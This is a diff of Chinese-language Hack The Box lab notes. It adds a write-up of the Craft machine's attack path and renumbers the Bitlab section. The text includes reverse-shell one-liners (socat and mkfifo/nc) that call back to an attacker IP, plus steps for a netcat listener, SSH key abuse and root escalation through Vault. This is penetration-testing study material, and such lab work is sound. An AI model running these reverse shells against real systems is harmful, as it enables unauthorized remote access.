@@ -48,7 +48,7 @@ Paper：[Write-ups for 0xrick's hack-the-box](https://0xrick.github.io/categorie
 - TTY交互式终端：使用socat，```#Listener: socat file:`tty`,raw,echo=0 tcp-listen:4444 #Victim: socat exec:`bash -li`,pty,stderr,setsid,sigint,sane tcp:1xx.xxx.xxx.xxx:4444```。
 - Linux提权：只要是以root权限运行的服务，都要逐一排查。如果是PHP、Python等启动的程序，要进行代码审计，重点发现文件包含、命令执行漏洞，寻找输入点，并借此进程获取root。
 
-### Bitlab
+### 三、Bitlab
 
 环境概述：Linux、Medium、30'、07 Sep 2019
 
@@ -71,3 +71,26 @@ Paper：[Write-ups for 0xrick's hack-the-box](https://0xrick.github.io/categorie
 - 数据库：若环境支持PHP，可以利用adminer，支持MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, SimpleDB, Elasticsearch, MongoDB。
 - URL格式：`postgres://user:pass@host.com:5432/path?k=v#f`，包含了模式（协议）、验证信息、主机、端口、路径、查询参数和查询片段。注意：`@`和`#`。
 - 二进制程序：在逆向程序前可先使用关键字进行strings匹配。
+
+### 四、Craft
+
+环境概述：Linux、Medium、30'、13 Jul 2019
+
+渗透流程：Nmap -> Web Enumeration -> RCE –> Shell on Docker Container -> Gilfoyle’s Gogs Credentials –> SSH Key –> SSH as Gilfoyle –> User Flag -> Vault –> One-Time SSH Password –> SSH as root –> Root Flag
+
+知识点：
+
+- 版本控制：查看代码的同时记得查看Git提交记录，即Commit History。
+- API泄露：根据API帮助文档，可构造请求数据包，获取服务器对应响应。
+- 反弹Shell：使用sh -i、nc，`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f`。
+- Python：作者写了个EXP demo，流程、输出都很清晰。其中，nc监听并实时返回结果可以利用subprocess子进程的Popen方法，`Popen(["nc","-lvnp",port])`。
+- 环境分析：在`/根目录`发现了`.dockerenv`文件，判定当前环境为Docker容器。
+- Linux登陆：使用SSH私钥，`ssh -i private.key user@host`。
+- 信息搜集：着重关注用户家目录下的`.xxx`文件，往往都是服务的配置文件，可快速定位当前用户常使用的软件服务。
+- Vault：一款密码保护工具，可以生成一次性root密码。
+
+思考：
+
+- 信息泄露：常用的版本控制工具除了Git还有SVN；利用公开的代码库搜索可能会有意外发现，可以使用[searchcode](https://searchcode.com)搜索来自Github, Bitbucket, Google Code, Codeplex, Sourceforge, Fedora Project, GitLab等开源仓库的代码内容。
+- 环境分析：Linux下可以通过查看etc下的release文件快速判断，`cat /etc/*release`。Docker可以通过查看网络接口来简单判断，`ip a`。
+- 文件查找：可以使用`ls -lat`按时间顺序来查看当前目录下的文件。
